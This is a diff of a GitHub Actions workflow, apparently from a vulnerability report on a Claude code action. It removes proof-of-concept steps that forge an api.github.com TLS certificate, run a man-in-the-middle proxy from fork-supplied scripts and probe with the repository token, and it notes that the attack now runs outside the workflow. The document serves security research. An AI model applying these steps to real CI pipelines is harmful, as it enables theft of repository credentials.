@@ -1,4 +1,6 @@
-name: PoC — fork PR .env MITM
+# ANT-005 v2 — consumer workflow matches examples/claude.yml (no impact steps).
+# Fork author supplies ONLY `.env` on PR head; MITM runs outside this workflow.
+name: Claude Code
 
 on:
   issue_comment:
@@ -9,72 +11,23 @@ permissions:
   pull-requests: write
   issues: write
   id-token: write
+  actions: read
 
 jobs:
-  env-fork-poc:
+  claude:
     if: |
       github.event.issue.pull_request &&
       contains(github.event.comment.body, '@claude')
     runs-on: ubuntu-latest
     steps:
-      # Matches examples/claude.yml: default branch checkout only (no refs/pull/N/head).
-      # Fork PR head (incl. attacker .env + .poc/) materialized by claude-code-action setupBranch (tag mode).
-      - uses: actions/checkout@v4
+      - name: Checkout repository
+        uses: actions/checkout@v4
         with:
           fetch-depth: 1
 
-      - uses: anthropics/claude-code-action@f87768c6d25f92ae6efa7175e223ef77d4cbf97f
+      - name: Run Claude Code
+        id: claude
+        uses: anthropics/claude-code-action@f87768c6d25f92ae6efa7175e223ef77d4cbf97f
         with:
           anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
           show_full_output: true
-
-      # MITM + probe run AFTER action branch switch — .poc/ and .env exist only on fork head.
-      - name: Generate MITM TLS material
-        run: |
-          openssl req -x509 -newkey rsa:2048 \
-            -keyout /tmp/mitm.key -out /tmp/mitm.crt -days 1 -nodes \
-            -subj "/CN=api.github.com"
-          echo "MITM cert CN=api.github.com"
-
-      - name: Start localhost MITM proxy
-        env:
-          MITM_PORT: "18080"
-          MITM_CERT: /tmp/mitm.crt
-          MITM_KEY: /tmp/mitm.key
-          POC_A3_OUT: ${{ runner.temp }}/poc-a3-env.txt
-        run: |
-          node .poc/mitm-connect-proxy.mjs &
-          echo $! > /tmp/mitm.pid
-          sleep 2
-          curl -sS -o /dev/null -w "proxy_up=%{http_code}\n" http://127.0.0.1:18080/ || true
-
-      - name: MCP-equivalent bun spawn probe (.env MITM)
-        env:
-          GITHUB_TOKEN: ${{ github.token }}
-          REPO_OWNER: ${{ github.repository_owner }}
-          REPO_NAME: ${{ github.event.repository.name }}
-        run: |
-          echo "=== POC-A3_PROBE ==="
-          test -f .env && echo "attacker_env=present" || echo "attacker_env=absent"
-          bun run .poc/probe-github-fetch.ts
-
-      - name: Collect MITM proof
-        if: always()
-        run: |
-          echo "=== ENV_FORK_COLLECTOR ==="
-          MARKER="${RUNNER_TEMP}/poc-a3-env.txt"
-          if [ -f "$MARKER" ]; then
-            cat "$MARKER"
-          else
-            echo "POC-A3 marker=absent"
-          fi
-          if [ -f "${RUNNER_TEMP}/poc-a3-mitm.log" ]; then
-            echo "=== MITM_LOG_TAIL ==="
-            tail -n 20 "${RUNNER_TEMP}/poc-a3-mitm.log"
-          fi
-          grep -E "from a fork|Restoring \.claude|POC-A3|MITM_CAPTURE|probe_fetch|Switched to branch" "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
-
-      - name: Stop MITM proxy
-        if: always()
-        run: |
-          if [ -f /tmp/mitm.pid ]; then kill "$(cat /tmp/mitm.pid)" 2>/dev/null || true; fi
